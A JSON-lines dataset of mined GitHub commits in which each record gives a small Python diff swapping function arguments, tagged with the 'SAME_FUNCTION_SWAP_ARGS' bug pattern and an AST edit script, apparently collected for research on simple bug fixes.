{"project": "keras", "commit_sha": "1cb81f2f9fe20074a3df13716ee3c8eb7bdec109", "parent_sha": "fc52d9a084699a549ec1aadc7aed839bde75ef7c", "file_path": "keras/backend/theano_backend.py", "project_url": "https://github.com/icyblade/keras", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1536,7 +1536,7 @@ def sparse_categorical_crossentropy(target, output, from_logits=False):\n     target = T.cast(T.flatten(target), 'int32')\n     target = T.extra_ops.to_one_hot(target, nb_class=output.shape[-1])\n     target = reshape(target, shape(output))\n-    return categorical_crossentropy(output, target, from_logits)\n+    return categorical_crossentropy(target, output, from_logits)\n \n \n def binary_crossentropy(target, output, from_logits=False):\n", "before": "return categorical_crossentropy ( output , target , from_logits )", "after": "return categorical_crossentropy ( target , output , from_logits )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:output\", 3, 37, 3, 43], [\"argument_list\", 3, 36, 3, 65], 3], [\"Move\", [\",:,\", 3, 43, 3, 44], [\"argument_list\", 3, 36, 3, 65], 4]]"}
{"project": "django-odnoklassniki-users", "commit_sha": "eef0b2f50510a514f1646e93107f04cbe6bbd842", "parent_sha": "3b5ff7aec5ea74c7c3b9f7a02975e548c1fe9457", "file_path": "odnoklassniki_users/models.py", "project_url": "https://github.com/gravityagency/django-odnoklassniki-users", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class User(OdnoklassnikiPKModel):\n         if len(parts) == 3:\n             try:\n                 parts = map(int, parts)\n-                born = date(parts[2], parts[1], parts[0])\n+                born = date(parts[0], parts[1], parts[2])\n             except ValueError:\n                 return\n             # Using solution from here\n", "before": "born = date ( parts [ 2 ] , parts [ 1 ] , parts [ 0 ] )", "after": "born = date ( parts [ 0 ] , parts [ 1 ] , parts [ 2 ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"subscript\", 3, 29, 3, 37], [\"argument_list\", 3, 28, 3, 58], 4], [\"Move\", [\"subscript\", 3, 49, 3, 57], [\"argument_list\", 3, 28, 3, 58], 1]]"}
{"project": "userline", "commit_sha": "017eac99bdd7dadbf9e32120839561bcaf3f0197", "parent_sha": "6bebd5499d480ba76db94482ee42e039bf520801", "file_path": "src/lib/output/neo4j.py", "project_url": "https://github.com/THIBER-ORG/userline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,4 +163,4 @@ class Neo4J():\n \t\t\t\texists = False\n \t\t\tif exists is False:\n \t\t\t\tself.rels['srcrelations'] = update_relations(self.rels['srclogin'],{username: {event['logon.srcid']:1}})\n-\t\t\t\tself.neo.run(\"MATCH (dst:User {{name:'{}'}}),(src:User {{name:'{}'}}) MERGE (dst)-[:FROM_SESSION {{logonid:'{}'}}]->(src)\".format(username,event['logon.srcid'],self.sessions[event['logon.srcid']]))\n+\t\t\t\tself.neo.run(\"MATCH (dst:User {{name:'{}'}}),(src:User {{name:'{}'}}) MERGE (dst)-[:FROM_SESSION {{logonid:'{}'}}]->(src)\".format(username,self.sessions[event['logon.srcid']],event['logon.srcid']))\n", "before": "self . neo . run ( \"MATCH (dst:User {{name:'{}'}}),(src:User {{name:'{}'}}) MERGE (dst)-[:FROM_SESSION {{logonid:'{}'}}]->(src)\" . format ( username , event [ 'logon.srcid' ] , self . sessions [ event [ 'logon.srcid' ] ] ) )", "after": "self . neo . run ( \"MATCH (dst:User {{name:'{}'}}),(src:User {{name:'{}'}}) MERGE (dst)-[:FROM_SESSION {{logonid:'{}'}}]->(src)\" . format ( username , self . sessions [ event [ 'logon.srcid' ] ] , event [ 'logon.srcid' ] ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"subscript\", 3, 165, 3, 200], [\"argument_list\", 3, 134, 3, 201], 3], [\"Insert\", [\"argument_list\", 3, 134, 3, 201], [\",:,\", \"T\"], 6], [\"Delete\", [\",:,\", 3, 164, 3, 165]]]"}
{"project": "Savvy", "commit_sha": "3762fc79eeddd888e653b18cb7dc6191fba25036", "parent_sha": "4e8403e51598d54bb7f8f005f937a5371be790de", "file_path": "backend/models/users.py", "project_url": "https://github.com/colinmcintosh/Savvy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -186,7 +186,7 @@ class UserDB(DB):\n             if token and expires:\n                 result[\"auth_token\"] = (token, expires.as_datetime().replace(tzinfo=None))\n         voting_history = VotingDB().get_user_history(user_id=result[\"user_id\"])\n-        return User(**result, voting_history=voting_history)\n+        return User(voting_history=voting_history, **result)\n \n     def get_auth_token(self, user):\n         from datetime import datetime\n", "before": "return User ( ** result , voting_history = voting_history )", "after": "return User ( voting_history = voting_history , ** result )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"keyword_argument\", 3, 31, 3, 60], [\"argument_list\", 3, 20, 3, 61], 1], [\"Insert\", [\"argument_list\", 3, 20, 3, 61], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 29, 3, 30]]]"}
{"project": "Gutenberg", "commit_sha": "5d78c2d52c1b402e3d1ebd34bba5cce9f0451417", "parent_sha": "75bd7b8da65106f5cb05b89f4df7652ba8891e62", "file_path": "gutenberg/common/serialization.py", "project_url": "https://github.com/ChillarAnand/Gutenberg", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,4 +35,4 @@ class SerializableObject(object):\n         with gzip.open(path, 'wb') as serialized:\n-            pickle.dump(serialized, self)\n+            pickle.dump(self, serialized)\n", "before": "pickle . dump ( serialized , self )", "after": "pickle . dump ( self , serialized )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:serialized\", 1, 25, 1, 35], [\"argument_list\", 1, 24, 1, 42], 3], [\"Move\", [\",:,\", 1, 35, 1, 36], [\"argument_list\", 1, 24, 1, 42], 4]]"}
{"project": "cartography", "commit_sha": "000415d0b8a0b019580e2c409646daa25ad7fca1", "parent_sha": "11424153d8c597669414f92a79c4207ab165b4b6", "file_path": "cartography/intel/aws/ec2.py", "project_url": "https://github.com/lyft/cartography", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1018,4 +1018,4 @@ def sync(neo4j_session, boto3_session, regions, account_id, sync_tag, common_job\n     sync_ec2_instances(neo4j_session, boto3_session, regions, account_id, sync_tag, common_job_parameters)\n     sync_ec2_auto_scaling_groups(neo4j_session, boto3_session, regions, account_id, sync_tag, common_job_parameters)\n     sync_load_balancers(neo4j_session, boto3_session, regions, account_id, sync_tag, common_job_parameters)\n-    sync_vpc_peering(neo4j_session, boto3_session, regions, sync_tag, account_id, common_job_parameters)\n+    sync_vpc_peering(neo4j_session, boto3_session, regions, account_id, sync_tag, common_job_parameters)\n", "before": "sync_vpc_peering ( neo4j_session , boto3_session , regions , sync_tag , account_id , common_job_parameters )", "after": "sync_vpc_peering ( neo4j_session , boto3_session , regions , account_id , sync_tag , common_job_parameters )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:sync_tag\", 3, 61, 3, 69], [\"argument_list\", 3, 21, 3, 105], 9], [\"Move\", [\",:,\", 3, 69, 3, 70], [\"argument_list\", 3, 21, 3, 105], 10]]"}
{"project": "robotframework", "commit_sha": "328eda24234ab6b460049d40c2850286731eee31", "parent_sha": "7dab8e99408d07fe6820d8d22c5d7a3e4a9cbcac", "file_path": "utest/webcontent/spec/data/create_jsdata_for_specs.py", "project_url": "https://github.com/liuyang0116/robotframework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def run_robot(testdata, output=OUTPUT):\n \n \n def create_jsdata(target, split_log, outxml=OUTPUT):\n-    result = Results(outxml, RebotSettings({'splitlog': split_log})).js_result\n+    result = Results(RebotSettings({'splitlog': split_log}), outxml).js_result\n     config = {'logURL': 'log.html', 'reportURL': 'report.html', 'background': {'fail': 'DeepPink'}}\n     with open(target, 'w') as output:\n         JsResultWriter(output, start_block='', end_block='\\n').write(result, config)\n", "before": "result = Results ( outxml , RebotSettings ( { 'splitlog' : split_log } ) ) . js_result", "after": "result = Results ( RebotSettings ( { 'splitlog' : split_log } ) , outxml ) . js_result", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 69], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 21, 3, 69], [\"identifier:outxml\", \"T\"], 4], [\"Delete\", [\"identifier:outxml\", 3, 22, 3, 28]], [\"Delete\", [\",:,\", 3, 28, 3, 29]]]"}
{"project": "regulations-site", "commit_sha": "5ba859eda9d9f6eebcfc6d5c25003a348d543469", "parent_sha": "1041cdebbecf11392289c095277225d98261ab55", "file_path": "regulations/tests/sanitize_fields_tests.py", "project_url": "https://github.com/StandardLaw/regulations-site", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class SanitizeFieldsTest(TestCase):\n         }\n         valid, message = sanitize_fields(test_body)\n         self.assertTrue(valid)\n-        self.assertTrue(\"extra_field removed\", \"extra_field\" not in test_body)\n+        self.assertTrue(\"extra_field\" not in test_body, \"extra_field removed\")\n \n     def test_field_too_long(self):\n         test_body = {\n", "before": "self . assertTrue ( \"extra_field removed\" , \"extra_field\" not in test_body )", "after": "self . assertTrue ( \"extra_field\" not in test_body , \"extra_field removed\" )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 24, 3, 79], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 3, 24, 3, 79], [\"string:\\\"extra_field removed\\\"\", \"T\"], 4], [\"Delete\", [\"string:\\\"extra_field removed\\\"\", 3, 25, 3, 46]], [\"Delete\", [\",:,\", 3, 46, 3, 47]]]"}
{"project": "easybuild-framework", "commit_sha": "0f406832a4518a8a24bc75329d370741ced1bb6e", "parent_sha": "9956c30917e0e20b6357b4c3cd905da4bdb1e6c7", "file_path": "easybuild/tools/filetools.py", "project_url": "https://github.com/ComputeCanada/easybuild-framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1195,7 +1195,7 @@ def apply_patch(patch_file, dest, fn=None, copy=False, level=None, use_git_am=Fa\n \n     if use_git_am:\n-        _log.deprecated('5.0', \"'use_git_am' named argument in apply_patch function has been renamed to 'use_git'\")\n+        _log.deprecated(\"'use_git_am' named argument in apply_patch function has been renamed to 'use_git'\", '5.0')\n         use_git = True\n \n     if build_option('extended_dry_run'):\n", "before": "_log . deprecated ( '5.0' , \"'use_git_am' named argument in apply_patch function has been renamed to 'use_git'\" )", "after": "_log . deprecated ( \"'use_git_am' named argument in apply_patch function has been renamed to 'use_git'\" , '5.0' )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"string:'5.0'\", 2, 25, 2, 30], [\"argument_list\", 2, 24, 2, 116], 3], [\"Move\", [\",:,\", 2, 30, 2, 31], [\"argument_list\", 2, 24, 2, 116], 4]]"}
{"project": "nova", "commit_sha": "4e0e0a6dd26fac7d4051b0982ca20081eede8573", "parent_sha": "db5caf2ff8f33e8b3e7f28f041127ee4ac8b1897", "file_path": "nova/tests/functional/notification_sample_tests/test_instance.py", "project_url": "https://github.com/ChameleonCloud/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -313,7 +313,7 @@ class TestInstanceNotificationSampleWithMultipleCompute(\n         # 3. instance.live_migration_pre.end\n         # 4. instance.live_migration_force_complete.start\n         # 5. instance.live_migration_force_complete.end\n-        self.assertGreaterEqual(6, len(fake_notifier.VERSIONED_NOTIFICATIONS),\n+        self.assertGreaterEqual(len(fake_notifier.VERSIONED_NOTIFICATIONS), 6,\n                                 fake_notifier.VERSIONED_NOTIFICATIONS)\n         self._verify_notification(\n             'instance-live_migration_force_complete-start',\n", "before": "self . assertGreaterEqual ( 6 , len ( fake_notifier . VERSIONED_NOTIFICATIONS ) , fake_notifier . VERSIONED_NOTIFICATIONS )", "after": "self . assertGreaterEqual ( len ( fake_notifier . VERSIONED_NOTIFICATIONS ) , 6 , fake_notifier . VERSIONED_NOTIFICATIONS )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 4, 71], [\"integer:6\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 32, 4, 71], [\",:,\", \"T\"], 5], [\"Delete\", [\"integer:6\", 3, 33, 3, 34]], [\"Delete\", [\",:,\", 3, 34, 3, 35]]]"}
{"project": "python-neutronclient", "commit_sha": "71804444d44712ff36087f9ce7337f2af7f67db9", "parent_sha": "2f571acb1074089027cd24cfbdada3a0680441d2", "file_path": "neutronclient/tests/unit/test_cli20.py", "project_url": "https://github.com/openstack/python-neutronclient", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -699,7 +699,7 @@ class ClientV2TestJson(CLITestV20Base):\n         try:\n             self.client.do_request('GET', '/test', body='', params=params)\n         except exceptions.RequestURITooLong as cm:\n-            self.assertNotEqual(cm.excess, 0)\n+            self.assertNotEqual(0, cm.excess)\n         else:\n             self.fail('Expected exception NOT raised')\n \n", "before": "self . assertNotEqual ( cm . excess , 0 )", "after": "self . assertNotEqual ( 0 , cm . excess )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\"integer:0\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 32, 3, 46], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 42, 3, 43]], [\"Delete\", [\"integer:0\", 3, 44, 3, 45]]]"}
{"project": "sympy", "commit_sha": "de2fcafe26be4422dd675ee88ef48647cab1e23e", "parent_sha": "a1529b607a742f5cc5eba568b69d99b0f07175e0", "file_path": "sympy/core/tests/test_args.py", "project_url": "https://github.com/ctefer/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1633,7 +1633,7 @@ def test_sympy__matrices__expressions__hadamard__HadamardProduct():\n     from sympy.matrices.expressions.hadamard import HadamardProduct\n     from sympy.matrices.expressions import MatrixSymbol\n     X = MatrixSymbol('X', x, y)\n-    Y = MatrixSymbol('Y', y, x)\n+    Y = MatrixSymbol('Y', x, y)\n     assert _test_args(HadamardProduct(X, Y))\n \n def test_sympy__matrices__expressions__matpow__MatPow():\n", "before": "Y = MatrixSymbol ( 'Y' , y , x )", "after": "Y = MatrixSymbol ( 'Y' , x , y )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:y\", 3, 27, 3, 28], [\"argument_list\", 3, 21, 3, 32], 5], [\"Move\", [\",:,\", 3, 28, 3, 29], [\"argument_list\", 3, 21, 3, 32], 6]]"}
{"project": "scikit-learn", "commit_sha": "b17cf7950169195c3301ad4afbfbf1a198364978", "parent_sha": "d5962d21335e98022a0172b91473a5c02d55ec41", "file_path": "scikits/learn/base.py", "project_url": "https://github.com/Commonlibs/scikit-learn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,4 +209,4 @@ class RegressorMixin(object):\n-        return explained_variance(y, self.predict(X))\n+        return explained_variance(self.predict(X), y)\n", "before": "return explained_variance ( y , self . predict ( X ) )", "after": "return explained_variance ( self . predict ( X ) , y )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 34, 0, 54], [\",:,\", \"T\"], 3], [\"Insert\", [\"argument_list\", 0, 34, 0, 54], [\"identifier:y\", \"T\"], 4], [\"Delete\", [\"identifier:y\", 0, 35, 0, 36]], [\"Delete\", [\",:,\", 0, 36, 0, 37]]]"}
{"project": "scikit-learn", "commit_sha": "3cb198cbc3f11cd20ceeed4884becd140b366e33", "parent_sha": "f60a956f92809cb8e3518ca47f3c6f19664ce6f7", "file_path": "scikits/learn/base.py", "project_url": "https://github.com/Commonlibs/scikit-learn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -239,7 +239,7 @@ class RegressorMixin(object):\n-        return explained_variance(self.predict(X), y)\n+        return explained_variance(y, self.predict(X))\n \n \n ################################################################################\n", "before": "return explained_variance ( self . predict ( X ) , y )", "after": "return explained_variance ( y , self . predict ( X ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 0, 34, 0, 54], [\"identifier:y\", \"T\"], 1], [\"Insert\", [\"argument_list\", 0, 34, 0, 54], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 0, 50, 0, 51]], [\"Delete\", [\"identifier:y\", 0, 52, 0, 53]]]"}
{"project": "ISB-CGC-data-proc", "commit_sha": "195679d6a75df912f12915cddeea6ffb3502a321", "parent_sha": "ee3385d61bdcda2ad30142f08d22dba57041aba3", "file_path": "gdc/etl/etl.py", "project_url": "https://github.com/isb-cgc/ISB-CGC-data-proc", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class Etl(object):\n             info = file2info[fields[-2] + '/' + fields[-1]]\r\n             if self.skip_file(config, path, file2info, info, log):\r\n                 continue\r\n-            file_df = self.process_file(config, data_type, outputdir, path, info, project, log)\r\n+            file_df = self.process_file(config, outputdir, data_type, path, info, project, log)\r\n             if complete_df is None:\r\n                 complete_df = file_df\r\n             else:\r\n", "before": "file_df = self . process_file ( config , data_type , outputdir , path , info , project , log )", "after": "file_df = self . process_file ( config , outputdir , data_type , path , info , project , log )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:data_type\", 3, 49, 3, 58], [\"argument_list\", 3, 40, 3, 96], 5], [\"Move\", [\",:,\", 3, 58, 3, 59], [\"argument_list\", 3, 40, 3, 96], 6]]"}
{"project": "arcana", "commit_sha": "882c8683e2cb9f08199fcc841fa1905bf41303e2", "parent_sha": "e89297d616a238735a519b15555d2c2a31cee494", "file_path": "arcana/data/file_format/base.py", "project_url": "https://github.com/MonashBI/arcana", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -153,7 +153,7 @@ class FileFormat(object):\n         except KeyError:\n             raise ArcanaNoConverterError(\n                 \"There is no converter to convert {} to {}, available:\\n{}\"\n-                .format(self, file_format,\n+                .format(file_format, self,\n                         '\\n'.join(\n                             '{} <- {}'.format(k, v)\n                             for k, v in self._converters.items())))\n", "before": "KeyError : raise ArcanaNoConverterError ( \"There is no converter to convert {} to {}, available:\\n{}\" . format ( self , file_format , '\\n' . join ( '{} <- {}' . format ( k , v ) for k , v in self . _converters . items ( ) ) ) )", "after": "KeyError : raise ArcanaNoConverterError ( \"There is no converter to convert {} to {}, available:\\n{}\" . format ( file_format , self , '\\n' . join ( '{} <- {}' . format ( k , v ) for k , v in self . _converters . items ( ) ) ) )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 25, 3, 29], \"file_format\"], [\"Update\", [\"identifier:file_format\", 3, 31, 3, 42], \"self\"]]"}
{"project": "holoviews", "commit_sha": "fbc9b3228d4979af9a996c23238a23fe51927583", "parent_sha": "109a0cf651a9e7102b4e37e664a008e86508bca8", "file_path": "holoviews/operation/normalization.py", "project_url": "https://github.com/Hongbo-Miao/holoviews", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -116,7 +116,7 @@ class Normalization(ElementOperation):\n         else:\n             raise ValueError(\"Key list length must match length of supplied ranges\")\n \n-        return match_spec(specs, element)\n+        return match_spec(element, specs)\n \n \n     def _process(self, view, key=None):\n", "before": "return match_spec ( specs , element )", "after": "return match_spec ( element , specs )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:specs\", 3, 27, 3, 32], [\"argument_list\", 3, 26, 3, 42], 3], [\"Move\", [\",:,\", 3, 32, 3, 33], [\"argument_list\", 3, 26, 3, 42], 4]]"}
{"project": "simso", "commit_sha": "6eb3e295a01c95c7687c5aae249f187ccdc7b61f", "parent_sha": "2ee636ecb31816b5d3e2ea17e351cdbbe899581f", "file_path": "simso/generator/task_generator.py", "project_url": "https://github.com/MaximeCheramy/simso", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -180,7 +180,7 @@ def gen_randfixedsum(nsets, u, n):\n-    return StaffordRandFixedSum(u, n, nsets)\n+    return StaffordRandFixedSum(n, u, nsets)\n \n \n def gen_kato_utilizations(nsets, umin, umax, target_util):\n", "before": "return StaffordRandFixedSum ( u , n , nsets )", "after": "return StaffordRandFixedSum ( n , u , nsets )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:u\", 0, 33, 0, 34], [\"argument_list\", 0, 32, 0, 45], 3], [\"Move\", [\",:,\", 0, 34, 0, 35], [\"argument_list\", 0, 32, 0, 45], 4]]"}
{"project": "simso", "commit_sha": "0eaf94acb87c6d94c0c71c36e3d5a6d6ebaa21f3", "parent_sha": "fd1d5f10aeeb8853674e2de19f59d508aa1429bf", "file_path": "simso/generator/task_generator.py", "project_url": "https://github.com/MaximeCheramy/simso", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ def gen_uunifastdiscard(nsets, u, n):\n-    return UUniFastDiscard(u, n, nsets)\n+    return UUniFastDiscard(n, u, nsets)\n \n \n def gen_randfixedsum(nsets, u, n):\n", "before": "return UUniFastDiscard ( u , n , nsets )", "after": "return UUniFastDiscard ( n , u , nsets )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:u\", 0, 28, 0, 29], [\"argument_list\", 0, 27, 0, 40], 3], [\"Move\", [\",:,\", 0, 29, 0, 30], [\"argument_list\", 0, 27, 0, 40], 4]]"}
{"project": "python-pathfinding", "commit_sha": "a08263c46f135df9ba76f93f4291b946f406b9f3", "parent_sha": "f13ca8e47793b14961c905b60f690cc213f8428b", "file_path": "pathfinding/finder/bi_a_star.py", "project_url": "https://github.com/brean/python-pathfinding", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class BiAStarFinder(AStarFinder):\n             if path:\n                 return path, runs\n \n-            path = self.check_neighbors(start, end, grid, end_open_list,\n+            path = self.check_neighbors(end, start, grid, end_open_list,\n                 open_value=BY_END, backtrace_by=BY_START)\n             if path:\n                 return path, runs\n", "before": "path = self . check_neighbors ( start , end , grid , end_open_list , open_value = BY_END , backtrace_by = BY_START )", "after": "path = self . check_neighbors ( end , start , grid , end_open_list , open_value = BY_END , backtrace_by = BY_START )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Update\", [\"identifier:start\", 3, 41, 3, 46], \"end\"], [\"Update\", [\"identifier:end\", 3, 48, 3, 51], \"start\"]]"}
{"project": "salt", "commit_sha": "699f30262871f06a270d991ca0046db0bfd043e4", "parent_sha": "f58ccdde6addcdb6374a1599758a377cc280811d", "file_path": "salt/modules/shadow.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -305,7 +305,7 @@ def set_password(name, password, use_usermod=False):\n         return uinfo['passwd'] == password\n     else:\n         # Use usermod -p (less secure, but more feature-complete)\n-        cmd = 'usermod -p {0} {1}'.format(name, password)\n+        cmd = 'usermod -p {0} {1}'.format(password, name)\n         __salt__['cmd.run'](cmd, python_shell=False, output_loglevel='quiet')\n         uinfo = info(name)\n         return uinfo['passwd'] == password\n", "before": "else : cmd = 'usermod -p {0} {1}' . format ( name , password )", "after": "else : cmd = 'usermod -p {0} {1}' . format ( password , name )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:name\", 3, 43, 3, 47], [\"argument_list\", 3, 42, 3, 58], 3], [\"Move\", [\",:,\", 3, 47, 3, 48], [\"argument_list\", 3, 42, 3, 58], 4]]"}
{"project": "xivo-acceptance", "commit_sha": "7c199627cdeb5188736d82e2a9898e6255a33438", "parent_sha": "e7bb8b9532b64d9ffdc6e4cc3a0e5c387d9f5145", "file_path": "xivo_lettuce/ws_utils.py", "project_url": "https://github.com/jaunis/xivo-acceptance", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class RestResponse(object):\n             assert_that(self.status_ok(), msg)\n \n     def check_regex(self, regex):\n-        matches = re.search(self.raw_data, regex)\n+        matches = re.search(regex, self.raw_data)\n         msg = \"Regex '%s' did not match. Response: %s\" % (regex, self.raw_data)\n         assert_that(matches, msg)\n \n", "before": "matches = re . search ( self . raw_data , regex )", "after": "matches = re . search ( regex , self . raw_data )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 50], [\"identifier:regex\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 28, 3, 50], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 42, 3, 43]], [\"Delete\", [\"identifier:regex\", 3, 44, 3, 49]]]"}
{"project": "trainer-card", "commit_sha": "fab67af5e83c01ae3a53e9af7b882bad54a13cae", "parent_sha": "a1ee615ca5d131eea34181b05f9c3b0ac20fb7e7", "file_path": "model/User.py", "project_url": "https://github.com/monster-club/trainer-card", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class User:\n \n     created = self.collection.insert_one(insert)\n     new_user = self.find(created.inserted_id)\n-    self.token.update(token['_id'], {'used': True})\n+    self.token.update({'used': True}, token['_id'])\n     new_user['goodies'] = token['goodies']\n     return new_user\n \n", "before": "self . token . update ( token [ '_id' ] , { 'used' : True } )", "after": "self . token . update ( { 'used' : True } , token [ '_id' ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"dictionary\", 3, 37, 3, 51], [\"argument_list\", 3, 22, 3, 52], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 52], [\",:,\", \"T\"], 4], [\"Delete\", [\",:,\", 3, 35, 3, 36]]]"}
{"project": "django-organizations", "commit_sha": "1bd0cb39a7ac66a7370e105d728706bca620221b", "parent_sha": "a8ecd5b19b1e2b0210d870913da239ba0db7551b", "file_path": "organizations/forms.py", "project_url": "https://github.com/nemesisdesign/django-organizations", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -127,5 +127,5 @@ class OrganizationAddForm(forms.ModelForm):\n                     **{'domain': get_current_site(self.request),\n                         'organization': self.cleaned_data['name'], \n                         'sender': self.request.user, 'created': True})\n-        return create_organization(self.cleaned_data['name'], user)\n+        return create_organization(user, self.cleaned_data['name'])\n \n", "before": "return create_organization ( self . cleaned_data [ 'name' ] , user )", "after": "return create_organization ( user , self . cleaned_data [ 'name' ] )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 35, 3, 68], [\"identifier:user\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 35, 3, 68], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 61, 3, 62]], [\"Delete\", [\"identifier:user\", 3, 63, 3, 67]]]"}
{"project": "odinweb.flask", "commit_sha": "64fb616447839d4fd8b65d31d8c38b02eaa3649e", "parent_sha": "818a1a4e1019273fdd5e44690d6c04862a62a391", "file_path": "odinweb/flask.py", "project_url": "https://github.com/python-odin/odinweb.flask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -125,7 +125,7 @@ class ApiBlueprint(ApiInterfaceBase):\n             node_type = TYPE_MAP.get(path_node.type, 'str')\n             if path_node.type_args:\n                 return \"<{}({}):{}>\".format(node_type, ', '.join(path_node.type_args), path_node.name)\n-            return \"<{}:{}>\".format(path_node.name, node_type)\n+            return \"<{}:{}>\".format(node_type, path_node.name)\n         return \"<{}>\".format(path_node.name)\n \n     def _bound_callback(self, operation):\n", "before": "return \"<{}:{}>\" . format ( path_node . name , node_type )", "after": "return \"<{}:{}>\" . format ( node_type , path_node . name )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 36, 3, 63], [\"identifier:node_type\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 36, 3, 63], [\",:,\", \"T\"], 2], [\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"identifier:node_type\", 3, 53, 3, 62]]]"}
{"project": "pyDatalog", "commit_sha": "a3e2466a032027762722b24897116a89d9112aa6", "parent_sha": "9d3a74d82b2648a3081888e49c4b1b739908cb20", "file_path": "pyDatalog/pyParser.py", "project_url": "https://github.com/andras-tim/pyDatalog", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -201,7 +201,7 @@ class Expression(object):\n     def __rdiv__(self, other):\r\n         return Operation(other, '/', self)\r\n     def __rtruediv__(self, other):\r\n-        return Operation(self, '/', other)\r\n+        return Operation(other, '/', self)\r\n     def __rfloordiv__(self, other):\r\n         return Operation(other, '//', self)\r\n     def __rpow__(self, other):\r\n", "before": "return Operation ( self , '/' , other )", "after": "return Operation ( other , '/' , self )", "sstub_pattern": "SAME_FUNCTION_SWAP_ARGS", "edit_script": "[[\"Move\", [\"identifier:self\", 3, 26, 3, 30], [\"argument_list\", 3, 25, 3, 43], 4], [\"Move\", [\"identifier:other\", 3, 37, 3, 42], [\"argument_list\", 3, 25, 3, 43], 1]]"}
